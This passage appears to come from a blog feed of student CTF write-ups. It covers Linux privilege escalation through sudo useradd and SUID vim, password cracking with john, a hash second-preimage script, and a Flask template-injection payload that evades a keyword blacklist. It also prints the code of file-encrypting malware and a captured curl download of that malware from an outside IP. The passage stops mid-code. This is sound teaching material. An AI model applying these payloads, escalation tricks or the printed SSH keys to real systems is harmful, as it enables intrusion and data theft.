iHithereHiHi:frederick:LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCYmRmYWc2YmFobFh4S3AwUmZDbTlzS3NsZ1B3ZEtacHhldjVrV3luZHViUUFBQUpEdWhKZW83b1NYCnFBQUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQmJkZmFnNmJhaGxYeEtwMFJmQ205c0tzbGdQd2RLWnB4ZXY1a1d5bmR1YlEKQUFBRUN2aUZvRFp1UThnZytjWmM0VjJIUUN3OFlNYVpkdFZWL3NTN0Nsb2RQaU1sdDE5cURwdHFHVmZFcW5SRjhLYjJ3cQp5V0EvQjBwbW5GNi9tUmJLZDI1dEFBQUFDM0pBYzNWa2IzZHZiMlJ2QVFJPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K:(2,18929204079384858729365442326481389204) We get the first flag: (2,18929204079384858729365442326481389204), sweet. We also have a name fredercik, along with a long string that sort of looks like a key when you convert it to base64, but we\u0026rsquo;ll save that for in a bit.\nConnecting to the other port, port 13337, we see that it\u0026rsquo;s actually just OpenSSH. So let\u0026rsquo;s try to connect to it with that name and key we got from the last step to see if we can get into the box.\n$ ssh -i key frederick@3.138.157.23 -p 13337 $ whoami Frederick Alright, we are in! Right away we see two files in Fred\u0026rsquo;s home directory: password_guide and top_100_password_ideas. Cating out password_guide we see:\nHi, To make a strong password, pick one from the list I included and add 2 digits onto the end! Neat, so it seems like their \u0026ldquo;strong password\u0026rdquo; is just going to be one of the hundred in that list + 2 digits, which to brute force is only 10,000 passwords. But what will be be brute forcing exactly?\nAfter doing some more enumeration on the box, we notice that Frederick has read access to shadow.bak, a backup of the file that stores the encrypted passwords for all users. Taking a look at this gives us a pretty good idea of what password we need to crack:\nroot:!(5,27562576550131620089134738750424271702):18644:0:99999:7::: daemon:*:18644:0:99999:7::: bin:*:18644:0:99999:7::: sys:*:18644:0:99999:7::: sync:*:18644:0:99999:7::: games:*:18644:0:99999:7::: man:*:18644:0:99999:7::: lp:*:18644:0:99999:7::: mail:*:18644:0:99999:7::: news:*:18644:0:99999:7::: uucp:*:18644:0:99999:7::: proxy:*:18644:0:99999:7::: www-data:*:18644:0:99999:7::: backup:*:18644:0:99999:7::: list:*:18644:0:99999:7::: irc:*:18644:0:99999:7::: gnats:*:18644:0:99999:7::: nobody:*:18644:0:99999:7::: _apt:*:18644:0:99999:7::: systemd-timesync:*:18644:0:99999:7::: systemd-network:*:18644:0:99999:7::: systemd-resolve:*:18644:0:99999:7::: messagebus:*:18644:0:99999:7::: sshd:*:18644:0:99999:7::: systemd-coredump:!!:18644:::::: frederick:!:18683:0:99999:7::: oldadmin:$6$S73ABQAuFHt.hyVw$2SB2MgTdEf5W2exQzr4kpgpvZ30lUubEPGlNkKlXYLxbPn7TG1IFh9aBzZrJ4VfYcymewmwJaW9WC3RKUVZKx/:18683:0:99999:7::: Not only that, but we get our second flag! (5,27562576550131620089134738750424271702)\nSo at this point it\u0026rsquo;s clear that we need to get access to oldadmin. We can use johntheripper with our knowledge of how the passwords are choosen to quickly crack the pass:\nAfter tinkering with john for a bit, we were eventually able to recover the password: freedom42. We now are able to SU to oldadmin with that password :)\nAs oldadmin, we continued to do a bit more enumeration. Looking through /etc/, we were able to cat out the sudoers files:\n# # This file MUST be edited with the \u0026#39;visudo\u0026#39; command as root. # # Please consider adding local content in /etc/sudoers.d/ instead of # directly modifying this file. # # See the man page for details on how to write a sudoers file. # Defaults env_reset Defaults mail_badpass Defaults secure_path=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\u0026#34; # Host alias specification # User alias specification # Cmnd alias specification # User privilege specification root ALL=(ALL:ALL) ALL # Allow members of group sudo to execute any command %sudo ALL=(ALL:ALL) ALL oldadmin ALL=(root) NOPASSWD:/root/script/adopt_dog # See sudoers(5) for more information on \u0026#34;#include\u0026#34; directives: #includedir /etc/sudoers.d Seems like as oldadmin we can run /root/script/adopt_dog without needing root\u0026rsquo;s password! Let\u0026rsquo;s check that out:\n#!/bin/bash userdel dog rm -rf /home/dog ARGS=$(echo \u0026#34;$@\u0026#34; | tr \u0026#34;\\\\\\\\()\u0026lt;\u0026gt;\\`\u0026#34; \u0026#34; \u0026#34;) groupadd dog useradd -g dog $ARGS -g dog -G dog -m -d /home/dog dog This script seems to take in any number of arguments (minus a few special blacklist characters), and then runs them with useradd to create a new user dog. Trying it out, we do see that it does indeed create that dog user and a home directory for it, but how do we become the dog? Well, since we have control over the arguments that are excecuted, we can just provide it with the encrypted password and then SU into the new user. Let\u0026rsquo;s try it out:\n$ sudo ./adopt_dog -p $(echo \u0026#34;boop\u0026#34; | openssl passwd -1 -stdin) $ su dog Password: $ whoami dog Neato! We are now a dog my wildest dreams have come true. What can we do with our newfound powers? Well, we can go check out our home!\nGoing to our home directory, we see\u0026hellip;. a flag? (6,103859969563713920733890450469614298693).\nThat\u0026rsquo;s great and all, but where in the world did it come from? The script we ran didn\u0026rsquo;t move anything into the home directory, and there is no cron job that\u0026rsquo;s updating this directory with the flag. Well it\u0026rsquo;s because of /etc/skel, which is one of the open parameters in the adopt_dog script. So the script checks /etc/skel by default, and anything in that directory get\u0026rsquo;s placed into dog\u0026rsquo;s home directory. Since we have control over that parameter, we can actually tell the script to include any directory we want with --skel and we will be able to read it! Let\u0026rsquo;s do it with the root directory and see if we can get root\u0026rsquo;s private ssh keys.\nSUing into dog again, we can now view all of root\u0026rsquo;s files, including a flag file in their .ssh directory! (7,115317666936746434141387300928816667814)\nWe also have root\u0026rsquo;s private keys, so we can just ssh into root whenever we want, sweet!\n-----BEGIN OPENSSH PRIVATE KEY----- b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW QyNTUxOQAAACA8/OKb2sIToYOGTKGRNcUTYFLZF+cp7JVqqWioCrfWAgAAAJBRR7KIUUey iAAAAAtzc2gtZWQyNTUxOQAAACA8/OKb2sIToYOGTKGRNcUTYFLZF+cp7JVqqWioCrfWAg AAAECMbmo1F61KDqpoOr0f7JKJ0+dmSZuVZETjuQfWyDhhajz84pvawhOhg4ZMoZE1xRNg UtkX5ynslWqpaKgKt9YCAAAAC3JAc3Vkb3dvb2RvAQI= -----END OPENSSH PRIVATE KEY----- Checking out the rest of root\u0026rsquo;s files, we get another flag in .bashrc: (1,41771917274972003437877223622233833933) (This one had us stumped for a bit, our inner guess gods let us down on this one)\nWe also did a bit more enumeration, specifically on the services that were running, and we found that there was running service on port 1338 that could only be reached through the localhost. Netcating to that service gave us our second to last flag! (3,66827439388718004166721471471671102060)\nAt this point, we have done pretty much everything we could without root privilages, so let\u0026rsquo;s use that key we got earlier to ssh into root.\nAfter even more enumeration and random guessing later, we found that root has access to the a file /opt/what/this/is/interesting/follow/this/path/to/get/a/flag/where/does/it/end/wow/this/is/taking/a/while/hmm/okay/tap/tap/tap/tap/tap/tap/hmm/here/you/go/lol/flag. A bunch of tabs presses later, and we get our last flag: (4,121577997023255799331813434873849479391)\nPhew! We can now put all these flags in shares.cvs, run the python script to decrypt the flag, and BOOM:\nosu{Shamir_makes_me_sad_but_linux_scavenger_hunt_makes_me_glad} Woop!\n","date":"1 March 2021","externalUrl":null,"permalink":"/posts/1716569287759-boxy/","section":"Posts","summary":"Time to poke at a linux box and see what there is to find.","title":"OSU League 2020/2021 - boxy Writeup","type":"posts"},{"content":"For this challenge, we are given three files: A PDF that explains the lore/backstory of our task, an ISO file, and a wordlist that seems to be a derivitive of the rockyou.txt wordlist.\nThe first thing I did was mount the ISO file to my file system to see its contents:\n$ sudo mount -o loop CTG-2021-02-19-001.iso /mnt/disk $ cd /mnt/disk $ ls lost+found rhodgson.kdbx Interesting, we have a keepass password database. Let\u0026rsquo;s see if we can open it:\n$ kpcli --kdb rhodgson.kdbx Please provide the master password: ************************* Couldn\u0026#39;t load the file rhodgson.kdbx: Missing pass Dang, looks like we need to know the master password\u0026hellip;. Or do we? (Insert Vsauce music)\nWe were given a password list right at the start, maybe we can use that to try and crack the password. Using johntheripper\u0026rsquo;s keepass2john, we can convert this kee pass db into a hash format that john can try to crack:\n$ ./keepass2john /mnt/disk/rhodgson.kdbx \u0026gt; hash.txt $ john --wordlist=CTG_STANDARD_WORDLIST.txt hash.txt Using default input encoding: UTF-8 Loaded 1 password hash (KeePass [SHA256 AES 32/64]) Cost 1 (iteration count) is 60000 for all loaded hashes Cost 2 (version) is 2 for all loaded hashes Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes Will run 8 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status 1hodgson (rhodgson) 1g 0:00:00:20 DONE (2021-02-20 18:12) 0.04803g/s 135.2p/s 135.2c/s 135.2C/s prield28..pinkphone98 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed And there we go! We have the password to the kee pass file, 1hodgson.\nWe can use that password and begin navigating the database.\nPlease provide the master password: ************************* KeePass CLI (kpcli) v3.1 is ready for operation. Type \u0026#39;help\u0026#39; for a description of available commands. Type \u0026#39;help \u0026lt;command\u0026gt;\u0026#39; for details on individual commands. kpcli:/\u0026gt; ls === Groups === rhodgson/ kpcli:/\u0026gt; cd rhodgson/ kpcli:/rhodgson\u0026gt; ls === Groups === eMail/ General/ Homebanking/ Internet/ Network/ Recycle Bin/ Windows/ === Entries === 0. My Flag Box 34.216.68.186 kpcli:/rhodgson\u0026gt; show -f My\\ Flag\\ Box Path: /rhodgson/ Title: My Flag Box Uname: ubuntu Pass: As.3S;d0cvAS3kmm3VI(N URL: 34.216.68.186 Notes: This aws thing is maybe useless cause I was messing with permissions, and now I cannot print the flag, and dont understand what I did when I was messing around with SUID bits. https://imgflip.com/i/4yladl kpcli:/rhodgson\u0026gt; We have an aws box with the password!! Default user on aws ubuntu boxes is ubuntu, so let\u0026rsquo;s try to SSH into 34.216.68.186 as that user and with that password:\nubuntu@ip-172-31-24-45 / % ls bin dev home lib32\tlibx32\tmedia opt\troot sbin srv tmp var boot etc lib\tlib64\tlost+found mnt proc run snap sys usr We are in! Let\u0026rsquo;s start looking for the flag:\nubuntu@ip-172-31-24-45 ~ % ls -lah total 180K drwxr-xr-x 7 ubuntu ubuntu 4.0K Feb 21 02:48 . drwxr-xr-x 4 root root 4.0K Feb 18 10:27 .. -rw------- 1 ubuntu ubuntu 61 Feb 20 03:44 .Xauthority -rw------- 1 ubuntu ubuntu 1.8K Feb 20 04:10 .bash_history -rw-r--r-- 1 ubuntu ubuntu 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 ubuntu ubuntu 3.7K Feb 25 2020 .bashrc drwx------ 2 ubuntu ubuntu 4.0K Feb 18 09:53 .cache drwx------ 3 ubuntu ubuntu 4.0K Feb 20 06:37 .config -rw------- 1 root root 28 Feb 19 02:56 .flag ubuntu@ip-172-31-24-45 ~ % cat .flag cat: .flag: Permission denied After a little digging, I was able to find .flag hidden in the home directory of ubuntu. But the file is only readable by root :/\nUsually with boxes like this, the first thing I look for is any SETUID binarys that I could use to priv esc or read certain files, so let\u0026rsquo;s try that:\nubuntu@ip-172-31-24-45 ~ % find / -perm -4000 2\u0026gt;/dev/null ... /usr/bin/at /usr/bin/sudo /usr/bin/vim.basic /usr/bin/newgrp /usr/bin/chfn /usr/bin/gpasswd /usr/bin/umount /usr/bin/fusermount /usr/bin/chsh /usr/bin/pkexec /usr/bin/mount /usr/bin/su /usr/bin/passwd Sweet! We have vim as a SETUID, that means we can just read the flag with root privileges by doing $ vim .flag:\nAnd we get the flag!\nosu{rAyh44n_is_b4d_@_0ps3c}\n","date":"22 February 2021","externalUrl":null,"permalink":"/posts/1716571871952-rayhanns_return/","section":"Posts","summary":"For this challenge, we are given three files: A PDF that explains the lore/backstory of our task, an ISO file, and a wordlist that seems to be a derivitive of the rockyou.","title":"OSU League 2020/2021 - rayhanns_return Writeup","type":"posts"},{"content":"For this crypto challenge, we are given a service we can connect to along with the source code of that service. Let\u0026rsquo;s connect to it:\nWelcome to secure_hash_TM bug bounty program! If you can find a second preimage to my hash, you will get a reward! Press Enter to continue to your challenge I hashed the hexstring 72432e1cd769b8ba328a8656ccaa9165023b26c87a0a7a2b9b83ccb882a6aabc4419c0ff35b2e6a6ce7202bb3ab590dcc957dcc946d3cfce5918d991db3e637f8e49ad48ec6fed47c73f7283e8d2d2136ea88bd67f1f1c0fd1dcac0c69d5aea4 using secure_hash_tm(), and my output was 1ab815160ddb4d48f00c472b59218b28a9b16f12efa40440d00c8709fb5ca8dee085f027460eeb642886ce71931147e658638dba71a4f2aa62011df4bfc69952 (feel free to check if you don\u0026#39;t believe me) Please find me a value \u0026#39;x\u0026#39; such that secure_hash_tm(x) == 1ab815160ddb4d48f00c472b59218b28a9b16f12efa40440d00c8709fb5ca8dee085f027460eeb642886ce71931147e658638dba71a4f2aa62011df4bfc69952 but x != 72432e1cd769b8ba328a8656ccaa9165023b26c87a0a7a2b9b83ccb882a6aabc4419c0ff35b2e6a6ce7202bb3ab590dcc957dcc946d3cfce5918d991db3e637f8e49ad48ec6fed47c73f7283e8d2d2136ea88bd67f1f1c0fd1dcac0c69d5aea4 to demonstrate that you found a vulnerability in the hashing algorithm (pfft, I know it\u0026#39;s fully secure so you\u0026#39;ll never get it!) Please provide your value for x (in hexstring form): 424242 When I ran secure_hash_tm(x), I got 9ddf7e70e5021544f4834bbee64a9e3789febc4be81470df629cad6ddb03320a5c, which does not equal 1ab815160ddb4d48f00c472b59218b28a9b16f12efa40440d00c8709fb5ca8dee085f027460eeb642886ce71931147e658638dba71a4f2aa62011df4bfc69952 So it looks like the goal of this challenge is to somehow find a different input that will be hashed to the same output, i.e. we are looking for a collision in however this hashing algorithm is implemented. Let\u0026rsquo;s take a look at that hashing algorithm is implemented:\n#!/usr/bin/env python3 import binascii from Crypto.Hash import SHA256 from Crypto.Random import get_random_bytes from typing import Iterator with open(\u0026#39;flag\u0026#39;, \u0026#39;r\u0026#39;) as f: flag = f.read().strip() def sha(data: bytes) -\u0026gt; bytes: algo = SHA256.new(data) return algo.digest() def xor(a: bytes, b: bytes) -\u0026gt; bytes: return bytes([x ^ y for x, y in zip(a, b)]) # Evenly split \u0026#39;data\u0026#39; into \u0026#39;n\u0026#39; parts def split_str(data: bytes, n: int) -\u0026gt; Iterator[bytes]: if len(data) % n != 0: print(f\u0026#34;Length of \u0026#39;data\u0026#39; must be a multiple of {n}\u0026#34;) raise ValueError section_len = len(data) // n return (data[i * section_len : (i + 1) * section_len] for i in range(n)) def secure_hash_tm(data: bytes) -\u0026gt; bytes: a, b, c = split_str(data, 3) w = xor(b, xor(sha(a), sha(c))) return xor(sha(w), a) + sha(c) def to_hex(data: bytes) -\u0026gt; str: return binascii.hexlify(data).decode() rnd = get_random_bytes(32 * 3) rnd_hash = secure_hash_tm(rnd) print(\u0026#34;Welcome to secure_hash_TM bug bounty program! If you can find a second preimage to my hash, you will get a reward!\u0026#34;) input(\u0026#34;Press Enter to continue to your challenge\\n\u0026#34;) print(f\u0026#34;I hashed the hexstring {to_hex(rnd)} using secure_hash_tm(), and my output was {to_hex(rnd_hash)} (feel free to check if you don\u0026#39;t believe me)\\n\u0026#34;) print(f\u0026#34;Please find me a value \u0026#39;x\u0026#39; such that secure_hash_tm(x) == {to_hex(rnd_hash)} but x != {to_hex(rnd)} to demonstrate that you found a vulnerability in the hashing algorithm (pfft, I know it\u0026#39;s fully secure so you\u0026#39;ll never get it!)\\n\u0026#34;) try: x = bytes.fromhex(input(\u0026#34;Please provide your value for x (in hexstring form): \u0026#34;)) except ValueError as e: print(f\u0026#34;Invalid input: {e}\u0026#34;) exit(1) x_hash = secure_hash_tm(x) if x != rnd: if x_hash == rnd_hash: print(f\u0026#34;Alright, fine: you found a preimage. Have your flag, just don\u0026#39;t tell my Cryptography professor about this: {flag}\u0026#34;) else: print(f\u0026#34;When I ran secure_hash_tm(x), I got {to_hex(x_hash)}, which does not equal {to_hex(rnd_hash)}\u0026#34;) else: print(\u0026#34;Haha, you copied the value of x from rnd! That\u0026#39;s not a second preimage ;)\u0026#34;) In particular, we will be focusing on the secure_hash_tm function to try and figure out what is really going on.\nI\u0026rsquo;ve simplified the function to a more barebones logic algorithm below, using || to mean concatination:\nHASH(a || b || c): w = b XOR (SHA(a) XOR SHA(c)) return SHA(w) XOR a || SHA(c) Here we can clearly see that our input c is not going to be able to be changed, as its SHA is directly appended to the output. This means that we will need to change a and b if we want to try and get a collision.\nLet\u0026rsquo;s start by picking a random value for w, call it w'. This makes the most sense since the only way to find w is if we already know what we are going to choose for our inputs, so maybe we can use w' to reverse all of our inputs.\nWe can split our output into two halves: out1 and out2. We know out2 is just going to be equal to SHA(c), so our c' = c.\nNext to find a' we reverse out1. out1 = SHA(w') XOR a'. Solving for a' gives a' = out1 XOR SHA(w')\nSince we know a', c', and w', we can find out last value b'. We just rearrange w' = b' XOR (SHA(a') XOR SHA(c')) to give b' = w' XOR (SHA(a') XOR SHA(c'))\na' + b' + c' is our attack! We can write a script to automate all of this (courtesy of Zander Work):\nimport binascii from Crypto.Hash import SHA256 from Crypto.Random import get_random_bytes from typing import Iterator from pwn import * def sha(data: bytes) -\u0026gt; bytes: algo = SHA256.new(data) return algo.digest() def xor(a: bytes, b: bytes) -\u0026gt; bytes: return bytes([x ^ y for x, y in zip(a, b)]) # Evenly split \u0026#39;data\u0026#39; into \u0026#39;n\u0026#39; parts def split_str(data: bytes, n: int) -\u0026gt; Iterator[bytes]: if len(data) % n != 0: print(f\u0026#34;Length of \u0026#39;data\u0026#39; must be a multiple of {n}\u0026#34;) raise ValueError section_len = len(data) // n return (data[i * section_len : (i + 1) * section_len] for i in range(n)) p = remote(\u0026#34;ctf-league.osusec.org\u0026#34;, 31312) p.recvline() p.recvline() p.sendline(\u0026#34;\u0026#34;) string= p.recvline().decode().strip().split() rnd = binascii.unhexlify(string[4]) rnd_hash = binascii.unhexlify(string[11]) c1, c2 = split_str(rnd_hash, 2) a, b, c = split_str(rnd, 3) cprime = c wprime = b\u0026#34;\\x00\u0026#34;*len(a) sha_wprime = sha(wprime) aprime = xor(sha_wprime, c1) bprime = xor(wprime, xor(sha(aprime), sha(cprime))) p.sendline(binascii.hexlify(aprime + bprime + cprime)) print(p.recvall(timeout=0.5).decode()) And running it we get the flag!\n[+] Opening connection to ctf-league.osusec.org on port 31312: Done [+] Receiving all data: Done (709B) [*] Closed connection to ctf-league.osusec.org port 31312 Please find me a value \u0026#39;x\u0026#39; such that secure_hash_tm(x) == 43f0966aba662d16380a64ff6dc0e2220270196e82fec996e6433ad53e2ccac4575453b2e04087834d358bea1974785e6815cf9ed64d858eee3125d5120381e5 but x != 23d437c8eb55aa14fdce984afe3b50218b3155d78311f81112910ed47b037a52e3f9f3797dddb64001e9834ab77f23139437aba822c28d9dab2fd4e54c636757b46aaaa26f20a6a0d1a058564b691545978f1371efca700b68a2e2c63b17cb6c to demonstrate that you found a vulnerability in the hashing algorithm (pfft, I know it\u0026#39;s fully secure so you\u0026#39;ll never get it!) Please provide your value for x (in hexstring form): Alright, fine: you found a preimage. Have your flag, just don\u0026#39;t tell my Cryptography professor about this: osu{L0ng-L1v3-L1niCrYpt-2016} ","date":"12 February 2021","externalUrl":null,"permalink":"/posts/1716571230616-make_a_hash/","section":"Posts","summary":"For this crypto challenge, we are given a service we can connect to along with the source code of that service.","title":"OSU League 2020/2021 - make_a_hash Writeup","type":"posts"},{"content":"For this web challenge, we are given a link to a website that bears a striking resemblance to a certain DEF CON challenge. pew pew\nWe are told the location of the flag and are provided the source code for the server, along with a nice text box where we can enter our team name.\nCool! Four P\u0026rsquo;s are better than three. Now Let\u0026rsquo;s take a look at that source code:\nfrom flask import Flask, render_template, request, send_file, render_template_string app = Flask(__name__) # scary names!! blacklist1 = \u0026#39;_[]\\\u0026#39;\\\u0026#34;\\\\%\u0026#39; blacklist2 = [\u0026#39;mro\u0026#39;, \u0026#39;config\u0026#39;, \u0026#39;base\u0026#39;, \u0026#39;join\u0026#39;, \u0026#39;os\u0026#39;, \u0026#39;subprocess\u0026#39;] @app.route(\u0026#39;/\u0026#39;) def root(): name = request.args.get(\u0026#39;name\u0026#39;) if name: name = name.lower() if any([c in blacklist1 for c in name]) or any([b in name for b in blacklist2]): name = \u0026#39;stop it :(\u0026#39; index = render_template(\u0026#39;index.html\u0026#39;, name=name) return render_template_string(index) @app.route(\u0026#39;/src\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def src(): return send_file(\u0026#39;server.py\u0026#39;) # todo run NOPs Interesting. We can see that some sort of blacklist has been implemented that prevents us from using certain character. Let\u0026rsquo;s tests that out and see if it works:\nYep, so our team name wasn\u0026rsquo;t able to go through, what a bummer.\nAt this point I started to do some research on what I could possibly do to read the flag off of the server. I knew that it had to be a server side injecton, so I looked into that. Eventually I came across what is know as a Flask SSTI, a type of server side template injection that Flask can be vulnerable to. I gave the input a simple template of {{request.args}} and voila.\nNow it\u0026rsquo;s time to start crafting a payload. We know that we can inject templates in the team name box, but those will all be checked against the blacklist. Maybe there is a way to add additional parameters that could then be read using request.args, that way the blacklisted items aren\u0026rsquo;t actually part of name, but instead some other variable that we created. Let\u0026rsquo;s try it out:\nhttp://ctf-league.osusec.org:31311/?name={{request.args.param1}}\u0026amp;param1=%%Scary_Name%%\nAnd there it is. We now have a way to bypass the filter. Now we just need to figure out how we are going to get the flag. After doing some more research, we were able to find that we could use request.application to access python\u0026rsquo;s internal built-in functions. We eventually settled on this for what we wanted to be excecuted on the server:\nrequest.application.__globals__.get(__builtins__).open(/flag)\nTo transform this into a usable payload, however, we had to set it up in such a way so that we could get around the blacklist. We were able to eventually come up with a method to transform any command into a usable payload:\na.b = request.args.a|attr(request.args.b) a(b) = reqiest.args.a(request.args.b) With this we can start to seperate out our command into sections:\nrequest.application + __globals__ get() with paramater __builtins__ open() with paramerter __flag__ And putting the whole payload together:\nhttp://ctf-league.osusec.org:31311/?name={{(request.application|attr(request.args.param1)).get(request.args.param2).open(request.args.param3).read()}}\u0026amp;param1=__globals__\u0026amp;param2=__builtins__\u0026amp;param3=/flag\nWe get the flag!\nosu{but_mY_bLAcKL1st_W4S_so_g00d:(}\n","date":"7 February 2021","externalUrl":null,"permalink":"/posts/1716569216545-almostnopship0/","section":"Posts","summary":"For this web challenge, we are given a link to a website that bears a striking resemblance to a certain DEF CON challenge.","title":"OSU League 2020/2021 - almostnopship0 Writeup","type":"posts"},{"content":" Another day, another intrusion here at IcyRetina. Can you help recover the encrypted files APT42 stole from this victim?\nThe catagory of this challenge is malware. To start, we are given a pcapng file named snowcone. Opening this up in Wireshark we are able to see an interesting http stream with the info of GET /snowcone.exe HTTP/1.1.\nExporting this stream as an http object will allow us to get the file. So after going to file -\u0026gt; export objects -\u0026gt; http, we are able to download the executable.\nNow, I really didn\u0026rsquo;t want to run this on my machine, as it is literally a piece of malware, so I instead went with some static analysis. I used dnSpy, as was reccomended for decompilation, and looking at the code we can start to get an understanding of what it\u0026rsquo;s doing.\nTo start, let\u0026rsquo;s look at main:\nusing System; using System.Text; using Snowcone.Properties; namespace Snowcone { // Token: 0x02000004 RID: 4 internal class Program { // Token: 0x06000009 RID: 9 RVA: 0x00002290 File Offset: 0x00000490 private static void Main(string[] args) { if (!SnowHelper.WillItSnow()) { Console.WriteLine(\u0026#34;it\u0026#39;s not going to snow here :(\u0026#34;); return; } if (args.Length == 0) { Console.WriteLine(\u0026#34;lol you forgot how to make it snow!\u0026#34;); Console.WriteLine(\u0026#34;usage: snowcone.exe [dir [dir [dir [...]]]\u0026#34;); return; } SnowMachine.OTP(Encoding.ASCII.GetBytes(Resources.key)); for (int i = 0; i \u0026lt; args.Length; i++) { SnowMachine.MakeItSnow(args[i]); } } } } We can see here that the program checks to see if the function WillItSnow() returns true. If it doesn\u0026rsquo;t, then the program exits. It seems that all WillItSnow() does is check to see if the user\u0026rsquo;s host name is equal to the one listed in the excecutable\u0026rsquo;s resources.\npublic static bool WillItSnow() { return Dns.GetHostName() == Resources.host; } Since our hostname isn\u0026rsquo;t what is listed in the program, we know that this program won\u0026rsquo;t work on our machine, as it will just instantly return due to a mismatch. But let\u0026rsquo;s keep going. Next the program just checks to see if the user didn\u0026rsquo;t supply any arguments, and if they didn\u0026rsquo;t, then return. The last bit here is where it gets juicy. The function SnowMachine.MakeItSnow(args[i]); is called.\npublic static void MakeItSnow(string dir) { string[] array = Directory.GetFiles(dir); for (int i = 0; i \u0026lt; array.Length; i++) { SnowMachine.SmallSnowcone(array[i]); } array = Directory.GetDirectories(dir); for (int i = 0; i \u0026lt; array.Length; i++) { SnowMachine.MakeItSnow(array[i]); } } Now what does this function do? Well, it takes a directory, and then recursivley traverses that directory, calling the function SmallSnowcone() on every single file it encounters. Knowing this is malware, we can probably already take a guess as to what it might be doing to those files, but let\u0026rsquo;s keep digging.\nprivate static void SmallSnowcone(string path) { if (path.EndsWith(\u0026#34;.sn0w\u0026#34;)) { return; } using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read)) { using (FileStream fileStream2 = new FileStream(path + \u0026#34;.sn0w\u0026#34;, FileMode.Create, FileAccess.Write)) { byte[] array = new byte[fileStream.Length]; byte[] array2 = new byte[fileStream.Length]; fileStream.Read(array, 0, (int)fileStream.Length); string text = SnowMachine.PickSomeFlavoring(); SnowMachine.SaltBaeDatFlavorIn(array, array2, text); byte[] array3 = SnowMachine.OTP(Encoding.ASCII.GetBytes(text)); for (int i = 0; i \u0026lt; 32; i++) { fileStream2.WriteByte(Convert.ToByte((int)(array3[i] | 128))); } fileStream2.Write(array2, 0, array2.Length); } } File.Delete(path); } SmallSnowcone() is definitely the meat of our program here. It takes in a path to a file, does some funky encryption to said file, and saves it with the extention .sn0w while deleting the original unencrypted file. This is probably the function that we are going to try and reverse. But what are we reversing it for? Surely we must be trying to decrypt some flag. Maybe looking back at the TCP stream could give us a hint.\nOpening up Wireshark again, I took a look at on of the TCP streams and followed it.\nC:\\Users\\Administrator\u0026gt;curl http://54.202.2.132:7331/snowcone.exe \u0026gt; snowcone.exe curl http://54.202.2.132:7331/snowcone.exe \u0026gt; snowcone.exe % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 0 0 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0 100 8192 100 8192 0 0 8192 0 0:00:01 --:--:-- 0:00:01 8000k C:\\Users\\Administrator\u0026gt;.\\snowcone.exe super_sensitive_documents .\\snowcone.exe super_sensitive_documents C:\\Users\\Administrator\u0026gt;tar -acf exfil.zip super_sensitive_documents tar -acf exfil.zip super_sensitive_documents C:\\Users\\Administrator\u0026gt;certutil -encode exfil.zip exfil.zip.b64 certutil -encode exfil.zip exfil.zip.b64 Input Length = 281020 Output Length = 386462 CertUtil: -encode command completed successfully. C:\\Users\\Administrator\u0026gt;type exfil.zip.b64 type exfil.zip.b64 -----BEGIN CERTIFICATE----- UEsDBBQAAAAAAEQBO1IAAAAAAAAAAAAAAAAaACAAc3VwZXJfc2Vuc2l0aXZlX2Rv Y3VtZW50cy9VVA0AB2GvEGBhrxBgRawQYHV4CwABBAAAAAAEAAAAAFBLAwQUAAgA ... bHNlY3VyaXR5Y2FyZC5qcGcuc24wd1VUDQAHYa8QYGGvEGBhrxBgdXgLAAEEAAAA AAQAAAAAUEsFBgAAAAAEAAQA2QEAAM1HBAAAAA== -----END CERTIFICATE----- We are given a lot of information here, so let\u0026rsquo;s take a look at it command by command. First, we see that the user downloaded the piece of malware using curl. They then ran the program with the directory super_sensitive_documents as input. As we know from the code, this directory is now surely encrypted. The user then zips the directory, and encodes it with base 64 to create a certificate representation of it. Knowing this, we can recover the encoded directory by just decoding the base 64, which would leave us with the original .zip.\nAfter doing this, we can see the contents of super_sensitive_documents:\n$tree super_sensitive_documents super_sensitive_documents/ ├── flag.txt.sn0w ├── passport.jpg.sn0w └── socialsecuritycard.jpg.sn0w $hexdump super_sensitive_documents/flag.txt.sn0w 0000000 f0b3 8aad ac86 f2f3 8190 98ac a7ad a489 0000010 b8ae aafb a186 a8f0 b2ad b381 f1b4 888f 0000020 411e 331a 0875 596e 1c26 6a0a 165c 3225 0000030 4f33 0757 3c33 0703 3730 3f2c 0718 3912 0000040 5704 3b30 030b 5202 2762 2717 000004c Perfect. There is our flag.txt.sn0w, and as expected it has been encrypted to a bunch of gibberish. Now that we have a file we want to decrypt, let\u0026rsquo;s go back to reversing that SmallSnowcone() function.\nprivate static void SmallSnowcone(string path) { if (path.EndsWith(\u0026#34;.sn0w\u0026#34;)) { return; } using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.Read)) { using (FileStream fileStream2 = new FileStream(path + \u0026#34;.sn0w\u0026#34;, FileMode.Create, FileAccess.Write)) { byte[] array = new byte[fileStream.Length]; byte[] array2 = new byte[fileStream.Length]; fileStream.Read(array, 0, (int)fileStream.Length); string text = SnowMachine.PickSomeFlavoring(); SnowMachine.SaltBaeDatFlavorIn(array, array2, text); byte[] array3 = SnowMachine.OTP(Encoding.ASCII.GetBytes(text)); for (int i = 0; i \u0026lt; 32; i++) { fileStream2.WriteByte(Convert.ToByte((int)(array3[i] | 128))); } fileStream2.Write(array2, 0, array2.Length); } } File.Delete(path); } So, we can see that our file is placed into the byte array array. After that, we have a string text which set to whatever is returned from PickSomeFlavoring().\nprivate static string PickSomeFlavoring() { string text = 